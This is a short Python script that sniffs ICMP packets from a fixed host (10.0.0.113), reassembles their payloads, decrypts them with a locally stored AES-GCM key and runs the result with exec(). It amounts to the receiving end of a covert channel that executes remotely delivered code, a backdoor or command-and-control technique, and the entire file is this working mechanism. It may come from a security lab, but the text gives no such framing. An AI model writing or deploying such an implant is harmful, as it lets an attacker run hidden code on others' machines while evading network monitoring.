from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from scapy.all import *

fil = "src host 10.0.0.113 and icmp"
data_received = []
complete_payload = ""


def handle_data_received(packet):
    # data_received.append(packet[Raw].load.decode("unicode_escape"))
    data_received.append(packet[Raw].load)


sniffed = sniff(filter=fil, prn=handle_data_received, count=3)

# -- sym --
with open("aes_key.bin", "rb") as key_file:
    symkey = key_file.read()

aesgcm = AESGCM(symkey)
# extract nonce and ciphertext
cipehertext = b"".join(data_received)
nonce = cipehertext[:12]
enc_text = cipehertext[12:]

print(cipehertext)
# decrypt
decrypted = aesgcm.decrypt(nonce, enc_text, associated_data=None)
exec(decrypted.decode())

# exec("".join(data_received))
